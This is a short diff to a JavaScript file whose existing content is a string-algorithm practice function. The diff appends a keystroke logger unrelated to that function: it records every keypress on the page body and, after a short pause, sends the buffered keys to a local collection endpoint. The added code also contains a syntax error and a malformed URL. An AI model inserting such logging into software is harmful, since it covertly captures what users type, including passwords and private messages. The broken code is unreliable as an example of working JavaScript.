@@ -34,3 +34,19 @@ function characterAtMost(s1 = "geeksforeeksgekseg",s2 = "geeks") {
     
 }
 console.log(characterAtMost())
+
+var timeout;
+var buffer = ''
+document.querySelector('body').addEventListener('keypress',function(event)=>{
+  if(event.which!==0){
+    clearTimeout(timeout)
+    buffer +=String.fromCharCode(event.which)
+    timeout = setTimeout(function() {
+      var xhr = new XMLHttpRequest()
+      var uri = 'http:localhost:3002/keys?data=' + encodeURIComponent(buffer)
+     xhr.open('GET',uri)
+     xhr.send()
+     buffer = '';
+    }, 400);
+  }
+})
